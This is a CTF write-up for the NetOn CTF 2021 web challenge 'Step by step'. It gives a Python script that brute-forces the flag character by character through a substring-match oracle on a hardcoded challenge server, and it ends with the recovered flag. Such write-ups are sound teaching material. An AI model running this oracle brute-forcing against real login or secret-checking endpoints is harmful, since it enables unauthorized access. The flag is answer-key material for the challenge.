---
title: NetOn CTF 2021 - Step by step
category: CTF
tags: web
hidden_tags: write-up
excerpt_separator: <!--more-->
---

Web -- 239 pts (13 solves) -- Chall author: X4v1l0k

The website leaks when we have a correct substring of the flag, so we can brute-force our way to the full flag.

<!--more-->

## Challenge

![](/assets/ctf/Coding%20-%20Step%20by%20step.png)

## Solution

So... they leave us to guess a password once again. More specifically, we are supposed to just guess the flag. To help us a bit, they tell us whenever we send in *part* of the flag. This makes it just another simple brute-force challenge through trial and error. Here is the Python script I used
```py
#!/usr/bin/env python

# Imports
import requests

# All ASCII characters
chrs = [chr(i) for i in range(256)]
# All characters that returned 'getting closer'
chrs = '0134:ABCDEFGLNOSTU_abcdefghilmnorstuv{}' 

#  Trial flag
flag = "S"

i = 0
while i<len(chrs):
	# Create new flag to try
	new_flag = chrs[i] + flag 
	# Push the flag to the website
	push = requests.post("http://167.99.129.209:7788/index.php",data={'flag':new_flag})
	# Check return html
	pt = push.text[50:80]
	# Check for return
	print new_flag, pt
	if pt[0] == 'H':
		flag = new_flag
		i = 0
		print flag
	elif pt[0] == 'S':
		i += 1
	else:
		print 'Found it?:', flag
		break

# Print found result
print flag
```

With some tempering of the initial trial flag, I managed to get back

```
SuBsTr1nGs_4r3_FuN_4nD_C0uLD_b3_vUln3rAbL3
```

which, submitted as NETON{SuBsTr1nGs_4r3_FuN_4nD_C0uLD_b3_vUln3rAbL3}, turned out to be correct. : )